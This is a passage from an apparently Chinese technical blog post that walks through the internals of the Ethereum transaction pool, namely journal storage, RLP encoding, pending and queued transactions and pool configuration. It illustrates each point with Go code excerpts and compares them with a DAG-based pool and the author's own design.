class="line"><span class="comment">//签名相关</span></span><br><span class="line">Pubkey sm2.PublicKey <span class="string">`json:&quot;pubkey&quot;`</span></span><br><span class="line">Sign   []<span class="keyword">byte</span>        <span class="string">`json:&quot;sign&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易同态密文拼接，用于k-top查找</span></span><br><span class="line">Cipher <span class="keyword">string</span> <span class="string">`json:&quot;cipher&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后这个实例被传递到一个 SendTransaction 函数，用来创建一个交易 Tx。创建交易的过程如下：</p><ol><li>根据 Address 字段找到当前账户</li><li>设置交易默认参数</li><li>检查交易签名是否合法</li><li>检查交易是否冲突</li><li>对交易进行序列化，变为可存储和传输的形式。</li><li>提交交易到交易池</li></ol><h1 id="交易管理"><a href="#交易管理" class="headerlink" title="交易管理"></a>交易管理</h1><p>以太坊将交易按状态分为两部分：<strong>可执行交易</strong>和<strong>非可执行交易</strong>。分别记录在 pending 容器中和 queue 容器中。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-1.png#clientId=u272c35f2-3d2a-4&from=paste&height=321&id=u5bf56761&margin=%5Bobject%20Object%5D&originHeight=538&originWidth=1160&originalType=binary&size=164987&status=done&style=none&taskId=u567ff6dc-553f-4a1c-af77-71fc9a19a73&width=693"><br>如上图所示，交易池先采用一个 txLookup (内部为 map）跟踪所有交易。同时将交易根据本地优先，价格优先原则将交易划分为两部分 queue 和 pending。而这两部交易则按账户分别跟踪。<br>为了不丢失未完成的本地交易，以太坊交易池通过 journal 文件存储和管理当前交易池中的本地交易，并定期更新存储。<br>下图是<strong>交易池对本地待处理交易的磁盘存储管理流程</strong>，涉及加载、实时写入和定期更新维护。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-2.png#clientId=u272c35f2-3d2a-4&from=paste&height=826&id=ufc47fc0d&margin=%5Bobject%20Object%5D&originHeight=1356&originWidth=870&originalType=url&status=done&style=none&taskId=ubb8c227e-5868-49f4-b1ea-77abbe42349&width=530"></p><h2 id="存储交易"><a href="#存储交易" class="headerlink" title="存储交易"></a>存储交易</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-3.png#clientId=u272c35f2-3d2a-4&from=paste&height=317&id=uc114cf13&margin=%5Bobject%20Object%5D&originHeight=432&originWidth=826&originalType=url&status=done&style=none&taskId=u8fb70d54-24fd-45a9-880e-9b7951920f0&width=606"><br>当交易池新交易来自于本地账户时 ❶，如果已开启记录本地交易，则将此交易加入 journal ❷。到交易池时，将实时存储到 journal 文件中。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_pool.go:757</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *TxPool)</span> <span class="title">journalTx</span><span class="params">(from common.Address, tx *types.Transaction)</span></span> &#123;</span><br><span class="line">   <span class="comment">// Only journal if it&#x27;s enabled and the transaction is local</span></span><br><span class="line">   <span class="keyword">if</span> pool.journal == <span class="literal">nil</span> || !pool.locals.contains(from) &#123;<span class="comment">//❶</span></span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := pool.journal.insert(tx); err != <span class="literal">nil</span> &#123; <span class="comment">//❷</span></span><br><span class="line">      log.Warn(<span class="string">&quot;Failed to journal local transaction&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 journal.insert 则将交易实时写入文件流中 ❸，相当于实时存储到磁盘。而在写入时，是将交易进行 RLP 编码。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_journal.go:120</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(journal *txJournal)</span> <span class="title">insert</span><span class="params">(tx *types.Transaction)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> journal.writer == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> errNoActiveJournal</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := rlp.Encode(journal.writer, tx); err != <span class="literal">nil</span> &#123;<span class="comment">//❸</span></span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>插一嘴，为什么要用 RLP 编码？</p></blockquote><h3 id="什么是-RLP"><a href="#什么是-RLP" class="headerlink" title="什么是 RLP"></a>什么是 RLP</h3><p>RLP(Recursive Length Prefix) 递归长度前缀编码是以太坊中最常使用的序列化格式方法。<br>RLP 旨在<strong>成为高度简约的序列化方法</strong>，<strong>唯一目标</strong>就是<strong>存储嵌套的字节数组</strong>。<br>RLP 只是以嵌套数组形式存储结构型数据，由上层协议来确定数组的含义。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-4.png#clientId=u272c35f2-3d2a-4&from=paste&height=443&id=u3b9d54f1&margin=%5Bobject%20Object%5D&originHeight=886&originWidth=1716&originalType=url&status=done&style=none&taskId=u8fd870e4-dcb8-44b2-bd3b-a5ba9cd4ba8&width=858"><br>从图中可以看出，不同类型的数据，将有不同的前缀标识。 前缀也可以理解为报文头，通过报文头可准确获取报文内容。 图中灰色部分则为 RLP 编码输出前缀。</p><h2 id="加载已存储交易"><a href="#加载已存储交易" class="headerlink" title="加载已存储交易"></a>加载已存储交易</h2><p>在交易池首次启动 journal 时，将主动将该文件已存储的交易加载到交易池。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_journal.go:61</span></span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(journal.path); os.IsNotExist(err) &#123; <span class="comment">//❶</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Open the journal for loading any past transactions</span></span><br><span class="line">input, err := os.Open(journal.path) <span class="comment">//❷</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> input.Close()</span><br></pre></td></tr></table></figure><p>处理时，如果文件不存在则退出 ❶，否则 Open 文件，获得 input 文件流 ❷。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_journal.go:76</span></span><br><span class="line">stream := rlp.NewStream(input, <span class="number">0</span>)<span class="comment">//❸</span></span><br><span class="line">total, dropped := <span class="number">0</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure><p>因为存储的内容格式是 rlp 编码内容，因此可以直接初始化 rlp 内容流 ❸，为连续解码做准备。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   failure error</span><br><span class="line">   batch   types.Transactions</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">   tx := <span class="built_in">new</span>(types.Transaction)</span><br><span class="line">   <span class="keyword">if</span> err = stream.Decode(tx); err != <span class="literal">nil</span> &#123; <span class="comment">//❹</span></span><br><span class="line">      <span class="keyword">if</span> err != io.EOF &#123;</span><br><span class="line">         failure = err</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> batch.Len() &gt; <span class="number">0</span> &#123;<span class="comment">//❼</span></span><br><span class="line">         loadBatch(batch)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   &#125;</span><br><span class="line">   total++</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> batch = <span class="built_in">append</span>(batch, tx); batch.Len() &gt; <span class="number">1024</span> &#123;<span class="comment">//❺</span></span><br><span class="line">      loadBatch(batch)<span class="comment">//❻</span></span><br><span class="line">      batch = batch[:<span class="number">0</span>]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadBatch := <span class="function"><span class="keyword">func</span><span class="params">(txs types.Transactions)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> _, err := <span class="keyword">range</span> add(txs) &#123;</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Debug(<span class="string">&quot;Failed to add journaled transaction&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">         dropped++ <span class="comment">//❽</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接进入 for 循环遍历，不断从 stream 中一笔笔地解码出交易 ❹。<br>但交易并非单笔直接载入交易池，而是采用批量提交模式，每 1024 笔交易提交一次 ❺。<br>批量写入，有利于降低交易池在每次写入交易后的更新。一个批次只需要更新（排序与超限处理等）一次。当然在遍历结束时（err==io.EOF）,也需要将当前批次中的交易载入 ❼。<br>loadBatch 就是将交易一批次加入到交易池，并获得交易池的每笔交易的处理情况。如果交易加入失败，则进行计数 ❽。最终在 load 方法执行完毕时，显示交易载入情况。</p><h1 id="交易添加到交易池"><a href="#交易添加到交易池" class="headerlink" title="交易添加到交易池"></a>交易添加到交易池</h1><p>SendTransaction 最后调用 SubmitTransaction 函数将交易提交到交易池，不过，更底层的调用是 AddLocals 函数。<br>这里需要注意，本地交易时调用 AddLocals，而从对等 p2p 节点发来的交易调用的是另一个函数，AddRemotes 函数。调用这两个函数之前都应该验证交易的有效性。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-5.png#clientId=u272c35f2-3d2a-4&from=paste&height=264&id=ue6089192&margin=%5Bobject%20Object%5D&originHeight=528&originWidth=1174&originalType=binary&size=236384&status=done&style=none&taskId=uf8820385-fb3b-42bb-ab6f-9ae0571e933&width=587"></p><blockquote><p>因为交易时通过节点的 API 接收，因此此交易被视为一笔来自本地(local)（图中用红球表示），在经过一系列校验和处理后。交易成功进入交易池，随后向已连接的邻近节点发送此交易。<br>当邻近节点，如矿工节点从邻近节点接收到此交易时，在进入交易池之前。会将交易标记为来自远方（remote）的交易（图中用绿球表示）。也需要经过校验和处理后，进入矿工节点的交易池，等待矿工打包到区块中。<br>如果邻近节点，不是矿工，也无妨。因为任何节点会默认将接受到得合法交易及时发送给邻近节点。得益于 P2P 网络，一笔交易平均在 6s 内扩散到整个以太坊公链网络的各个节点中。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-6.png#clientId=u272c35f2-3d2a-4&from=paste&height=254&id=u528314c1&margin=%5Bobject%20Object%5D&originHeight=373&originWidth=924&originalType=binary&size=74906&status=done&style=none&taskId=uae16074d-7e82-4415-a530-f8a271e0047&width=629"><br>下面我们来看一下交易池的结构：</p><blockquote><p>这是以太坊的</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TxPool contains all currently known transactions. Transactions</span></span><br><span class="line"><span class="comment">// enter the pool when they are received from the network or submitted</span></span><br><span class="line"><span class="comment">// locally. They exit the pool when they are included in the blockchain.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The pool separates processable transactions (which can be applied to the</span></span><br><span class="line"><span class="comment">// current state) and future transactions. Transactions move between those</span></span><br><span class="line"><span class="comment">// two states over time as they are received and processed.</span></span><br><span class="line"><span class="keyword">type</span> TxPool <span class="keyword">struct</span> &#123;</span><br><span class="line">config      TxPoolConfig</span><br><span class="line">chainconfig *params.ChainConfig</span><br><span class="line">chain       blockChain</span><br><span class="line">gasPrice    *big.Int</span><br><span class="line">txFeed      event.Feed</span><br><span class="line">scope       event.SubscriptionScope</span><br><span class="line">signer      types.Signer</span><br><span class="line">mu          sync.RWMutex</span><br><span class="line"></span><br><span class="line">istanbul <span class="keyword">bool</span> <span class="comment">// Fork indicator whether we are in the istanbul stage.</span></span><br><span class="line"></span><br><span class="line">currentState  *state.StateDB <span class="comment">// Current state in the blockchain head</span></span><br><span class="line">pendingNonces *txNoncer      <span class="comment">// Pending state tracking virtual nonces</span></span><br><span class="line">currentMaxGas <span class="keyword">uint64</span>         <span class="comment">// Current gas limit for transaction caps</span></span><br><span class="line"></span><br><span class="line">locals  *accountSet <span class="comment">// Set of local transaction to exempt from eviction rules</span></span><br><span class="line">journal *txJournal  <span class="comment">// Journal of local transaction to back up to disk</span></span><br><span class="line"></span><br><span class="line">pending <span class="keyword">map</span>[common.Address]*txList   <span class="comment">// All currently processable transactions</span></span><br><span class="line">queue   <span class="keyword">map</span>[common.Address]*txList   <span class="comment">// Queued but non-processable transactions</span></span><br><span class="line">beats   <span class="keyword">map</span>[common.Address]time.Time <span class="comment">// Last heartbeat from each known account</span></span><br><span class="line">all     *txLookup                    <span class="comment">// All transactions to allow lookups</span></span><br><span class="line">priced  *txPricedList                <span class="comment">// All transactions sorted by price</span></span><br><span class="line"></span><br><span class="line">chainHeadCh     <span class="keyword">chan</span> ChainHeadEvent</span><br><span class="line">chainHeadSub    event.Subscription</span><br><span class="line">reqResetCh      <span class="keyword">chan</span> *txpoolResetRequest</span><br><span class="line">reqPromoteCh    <span class="keyword">chan</span> *accountSet</span><br><span class="line">queueTxEventCh  <span class="keyword">chan</span> *types.Transaction</span><br><span class="line">reorgDoneCh     <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">reorgShutdownCh <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;  <span class="comment">// requests shutdown of scheduleReorgLoop</span></span><br><span class="line">wg              sync.WaitGroup <span class="comment">// tracks loop, scheduleReorgLoop</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中最核心的是两个字段，pending 和 queue<br><strong>queued 存放未来的、当前无法执行的交易</strong>。以太坊使用 nonce 值决定某个账户的交易顺序，多条交易值 nonce 值必须连续，如果和过去的交易不连续，则无法执行，我们不妨使用 nonce 值，标记交易的号码，nonce 为 10 的交易，称为第 10 号交易。举个例子，当前账户的 nonce 是 10，txpool 中有该账户的第 100 号交易，但 txpool 中没有第 11<del>99 号交易，这些交易的缺失，造成第 100 号交易无法执行，所以第 100 号交易就是未来的交易、不可执行的交易，存放在 queue 中。<br><strong>pending 存放可执行的交易</strong>。比如我们把上面的 11</del>99 号交易补全了，那么 11~100 号交易都可以进入到 pending，因为这些交易都是连续的，都可以打包进区块。<br>当节点收到交易（本地节点发起的或 peer 广播来的）时，会先存放到 queued，txpool 在某些情况下，把 queued 中可执行的交易，转移到 pending 中。<br>其中 config 的结构体为：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TxPoolConfig are the configuration parameters of the transaction pool.</span></span><br><span class="line"><span class="keyword">type</span> TxPoolConfig <span class="keyword">struct</span> &#123;</span><br><span class="line">Locals    []common.Address <span class="comment">// Addresses that should be treated by default as local</span></span><br><span class="line">NoLocals  <span class="keyword">bool</span>             <span class="comment">// Whether local transaction handling should be disabled</span></span><br><span class="line">Journal   <span class="keyword">string</span>           <span class="comment">// Journal of local transactions to survive node restarts</span></span><br><span class="line">Rejournal time.Duration    <span class="comment">// Time interval to regenerate the local transaction journal</span></span><br><span class="line"></span><br><span class="line">PriceLimit <span class="keyword">uint64</span> <span class="comment">// Minimum gas price to enforce for acceptance into the pool</span></span><br><span class="line">PriceBump  <span class="keyword">uint64</span> <span class="comment">// Minimum price bump percentage to replace an already existing transaction (nonce)</span></span><br><span class="line"></span><br><span class="line">AccountSlots <span class="keyword">uint64</span> <span class="comment">// Number of executable transaction slots guaranteed per account</span></span><br><span class="line">GlobalSlots  <span class="keyword">uint64</span> <span class="comment">// Maximum number of executable transaction slots for all accounts</span></span><br><span class="line">AccountQueue <span class="keyword">uint64</span> <span class="comment">// Maximum number of non-executable transaction slots permitted per account</span></span><br><span class="line">GlobalQueue  <span class="keyword">uint64</span> <span class="comment">// Maximum number of non-executable transaction slots for all accounts</span></span><br><span class="line"></span><br><span class="line">Lifetime time.Duration <span class="comment">// Maximum amount of time non-executable transaction are queued</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Quorum</span></span><br><span class="line">TransactionSizeLimit <span class="keyword">uint64</span> <span class="comment">// Maximum size allowed for valid transaction (in KB)</span></span><br><span class="line">MaxCodeSize          <span class="keyword">uint64</span> <span class="comment">// Maximum size allowed of contract code that can be deployed (in KB)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;</span><br><span class="line">Journal:   <span class="string">&quot;transactions.rlp&quot;</span>,</span><br><span class="line">Rejournal: time.Hour,</span><br><span class="line"></span><br><span class="line">PriceLimit: <span class="number">1</span>,</span><br><span class="line">PriceBump:  <span class="number">10</span>,</span><br><span class="line"></span><br><span class="line">AccountSlots: <span class="number">16</span>,</span><br><span class="line">GlobalSlots:  <span class="number">4096</span>,</span><br><span class="line">AccountQueue: <span class="number">64</span>,</span><br><span class="line">GlobalQueue:  <span class="number">1024</span>,</span><br><span class="line"></span><br><span class="line">Lifetime: <span class="number">3</span> * time.Hour,</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quorum</span></span><br><span class="line">TransactionSizeLimit: <span class="number">64</span>,</span><br><span class="line">MaxCodeSize:          <span class="number">24</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Locals: 定义了一组视为 local 交易的账户地址。任何来自此清单的交易均被视为 local 交易。</li><li>NoLocals: 是否禁止 local 交易处理。默认为 fasle,允许 local 交易。如果禁止，则来自 local 的交易均视为 remote 交易处理。</li><li>Journal： 存储 local 交易记录的文件名，默认是./transactions.rlp。</li><li>Rejournal：定期将 local 交易存储文件中的时间间隔。默认为每小时一次。</li><li>PriceLimit： remote 交易进入交易池的最低 Price 要求。此设置对 local 交易无效。默认值 1。</li><li>PriceBump：替换交易时所要求的价格上调涨幅比例最低要求。任何低于要求的替换交易均被拒绝。</li><li>AccountSlots： 当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</li><li>GlobalSlots： 交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 4096 笔交易。</li><li>AccountQueue：交易池中单个账户非可执行交易上限，默认是 64 笔。</li><li>GlobalQueue： 交易池中所有非可执行交易上限，默认 1024 笔。</li><li>Lifetime： 允许 remote 的非可执行交易可在交易池存活的最长时间。交易池每分钟检查一次，一旦发现有超期的 remote 账户，则移除该账户下的所有非可执行交易。默认为 3 小时。<blockquote><p>参考：<a href="https://learnblockchain.cn/books/geth/part2/txpool/txpool.html">https://learnblockchain.cn/books/geth/part2/txpool/txpool.html</a></p></blockquote></li></ul><p>上面配置中，包含两个重要概念<strong>可执行交易</strong>和<strong>非可执行交易</strong>。可执行交易是指从交易池中择优选出的一部分交易可以被执行，打包到区块中。非可执行交易则相反，任何刚进入交易池的交易均属于非可执行状态，在某一个时刻才会提升为可执行状态。</p><blockquote><p>这是 dag 的</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TxPool <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// The following variables must only be used atomically.</span></span><br><span class="line">lastUpdated <span class="keyword">int64</span> <span class="comment">// last time pool was updated</span></span><br><span class="line"></span><br><span class="line">mtx           sync.RWMutex</span><br><span class="line">cfg           Config</span><br><span class="line">pool          <span class="keyword">map</span>[chainhash.Hash]*TxDesc</span><br><span class="line">orphans       <span class="keyword">map</span>[chainhash.Hash]*orphanTx</span><br><span class="line">orphansByPrev <span class="keyword">map</span>[wire.OutPoint]<span class="keyword">map</span>[chainhash.Hash]*soterutil.Tx</span><br><span class="line">outpoints     <span class="keyword">map</span>[wire.OutPoint]*soterutil.Tx</span><br><span class="line">pennyTotal    <span class="keyword">float64</span> <span class="comment">// exponentially decaying total for penny spends.</span></span><br><span class="line">lastPennyUnix <span class="keyword">int64</span>   <span class="comment">// unix time of last ``penny spend&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// nextExpireScan is the time after which the orphan pool will be</span></span><br><span class="line"><span class="comment">// scanned in order to evict orphans.  This is NOT a hard deadline as</span></span><br><span class="line"><span class="comment">// the scan will only run when an orphan is added to the pool as opposed</span></span><br><span class="line"><span class="comment">// to on an unconditional timer.</span></span><br><span class="line">nextExpireScan time.Time</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交易提交到交易池还需要一个 add 函数，逻辑很简单：</p><ol><li>验证交易的有效性</li><li>如果 nonce 已存在，忽略。</li><li>如果 nonce 不存在，不可以替换 pending 中的任何交易，此时将新的交易插入 queue 的末尾</li></ol><p>注：交易中的 nonce 指的是 from 账户发出交易的次数, 从 0 开始递增，同一账户的交易会被依次确认，所以同一个 nonce 代表是同一个交易，会优先选择 price 更高的交易。</p><blockquote><p>这是我们的</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TxPool <span class="keyword">struct</span> &#123;</span><br><span class="line">    mtx           sync.RWMutex</span><br><span class="line">    config      TxPoolConfig</span><br><span class="line">    currentState  *state.StateDB <span class="comment">// 区块的当前状态</span></span><br><span class="line">    locals  *accountSet <span class="comment">//本地交易</span></span><br><span class="line">    journal *txJournal  <span class="comment">//  用于存储local交易记录的文件</span></span><br><span class="line"></span><br><span class="line">pending <span class="keyword">map</span>[common.Address]*txList   <span class="comment">// 存放可执行的交易</span></span><br><span class="line">queue   <span class="keyword">map</span>[common.Address]*txList   <span class="comment">// queued存放未来的、当前无法执行的交易</span></span><br><span class="line"></span><br><span class="line">    chainHeadSub    event.Subscription<span class="comment">//用于订阅区块</span></span><br><span class="line">    reqPromoteCh    <span class="keyword">chan</span> *accountSet<span class="comment">//账户集合</span></span><br><span class="line">queueTxEventCh  <span class="keyword">chan</span> *dag.Tx<span class="comment">//Tx队列事件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TxPoolConfig <span class="keyword">struct</span> &#123;</span><br><span class="line">Locals    []common.Address</span><br><span class="line">Journal   <span class="keyword">string</span></span><br><span class="line">Rejournal time.Duration</span><br><span class="line"></span><br><span class="line">AccountSlots <span class="keyword">uint64</span></span><br><span class="line">GlobalSlots  <span class="keyword">uint64</span></span><br><span class="line">AccountQueue <span class="keyword">uint64</span></span><br><span class="line">GlobalQueue  <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line">Lifetime time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;</span><br><span class="line">Journal:   <span class="string">&quot;transactions.rlp&quot;</span>,</span><br><span class="line">Rejournal: time.Hour,</span><br><span class="line"></span><br><span class="line">AccountSlots: <span class="number">16</span>,</span><br><span class="line">GlobalSlots:  <span class="number">8192</span>,</span><br><span class="line">AccountQueue: <span class="number">64</span>,</span><br><span class="line">GlobalQueue:  <span class="number">1024</span>,</span><br><span class="line"></span><br><span class="line">Lifetime: <span class="number">3</span> * time.Hour,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当节点收到交易（本地节点发起的或 peer 广播来的）时，会先存放到 queued，txpool 在某些情况下，把 queued 中可执行的交易，转移到 pending 中。</p><ul><li>Locals: 定义了一组视为 local 交易的账户地址。任何来自此清单的交易均被视为 local 交易。</li><li>Journal： 存储 local 交易记录的文件名，默认是./transactions.rlp。</li><li>Rejournal：定期将 local 交易存储文件中的时间间隔。默认为每小时一次。</li><li>AccountSlots： 当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</li><li>GlobalSlots： 交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 8192 笔交易。</li><li>AccountQueue：交易池中单个账户非可执行交易上限，默认是 64 笔。</li><li>GlobalQueue： 交易池中所有非可执行交易上限，默认 1024 笔。</li><li>Lifetime： 允许 remote 的非可执行交易可在交易池存活的最长时间。交易池每分钟检查一次，一旦发现有超期的 remote 账户，则移除该账户下的所有非可执行交易。默认为 3 小时。</li></ul><h2 id="链状态"><a href="#链状态" class="headerlink" title="链状态"></a>链状态</h2><p>在交易池启动后，将订阅链的区块头事件：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_pool.go:274</span></span><br><span class="line">pool.chainHeadSub = pool.chain.SubscribeChainHeadEvent(pool.chainHeadCh)</span><br></pre></td></tr></table></figure><p>并开始监听新事件：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_pool.go:305</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">   <span class="keyword">select</span> &#123;</span><br><span class="line">   <span class="comment">// Handle ChainHeadEvent</span></span><br><span class="line">   <span class="keyword">case</span> ev := &lt;-pool.chainHeadCh:</span><br><span class="line">      <span class="keyword">if</span> ev.Block != <span class="literal">nil</span> &#123;</span><br><span class="line">         pool.mu.Lock()</span><br><span class="line">         <span class="keyword">if</span> pool.chainconfig.IsHomestead(ev.Block.Number()) &#123;</span><br><span class="line">            pool.homestead = <span class="literal">true</span></span><br><span class="line">         &#125;</span><br><span class="line">         pool.reset(head.Header(), ev.Block.Header())</span><br><span class="line">         head = ev.Block</span><br><span class="line"></span><br><span class="line">         pool.mu.Unlock()</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收到事件后，将执行 func (pool *TxPool) reset(oldHead, newHead *types.Header)方法更新 state 和处理交易。核心是将交易池中已经不符合要求的交易删除并更新整理交易</p><h2 id="本地交易"><a href="#本地交易" class="headerlink" title="本地交易"></a>本地交易</h2><p>在交易池中将交易标记为 local 的有多种用途：</p><ol><li>在本地磁盘存储已发送的交易。这样，本地交易不会丢失，重启节点时可以重新加载到交易池，实时广播出去。</li><li>可以作为外部程序和以太坊沟通的一个渠道。外部程序只需要监听文件内容变化，则可以获得交易清单。</li><li>local 交易可优先于 remote 交易。对交易量的限制等操作，不影响 local 下的账户和交易。</li></ol><p>对应本地交易存储，在启动交易池时根据配置开启本地交易存储能力：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_pool.go:264</span></span><br><span class="line"><span class="keyword">if</span> !config.NoLocals &amp;&amp; config.Journal != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">pool.journal = newTxJournal(config.Journal)</span><br><span class="line"><span class="keyword">if</span> err := pool.journal.load(pool.AddLocals); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Failed to load transaction journal&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并从磁盘中加载已有交易到交易池。在新的 local 交易进入交易池时，将被实时写入 journal 文件。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/tx_pool.go:757</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *TxPool)</span> <span class="title">journalTx</span><span class="params">(from common.Address, tx *types.Transaction)</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> pool.journal == <span class="literal">nil</span> || !pool.locals.contains(from) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := pool.journal.insert(tx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Warn(<span class="string">&quot;Failed to journal local transaction&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上可看到，<strong>只有属于 local 账户的交易才会被记录</strong>。你又没有注意到，如果仅仅是这样的话，journal 文件是否会跟随本地交易而无限增长？答案是否定的，<strong>虽然无法实时从 journal 中移除交易。但是支持定期更新 journal 文件</strong>。<br><strong>journal 并不是保存所有的本地交易以及历史</strong>，他<strong>仅仅是存储当前交易池中存在的本地交易</strong>。因此交易池会定期对 journal 文件执行 rotate，将交易池中的本地交易写入 journal 文件，并丢弃旧数据。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">journal := time.NewTicker(pool.config.Rejournal)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="comment">//core/tx_pool.go:353</span></span><br><span class="line"><span class="keyword">case</span> &lt;-journal.C:</span><br><span class="line"><span class="keyword">if</span> pool.journal != <span class="literal">nil</span> &#123;</span><br><span class="line">pool.mu.Lock()</span><br><span class="line"><span 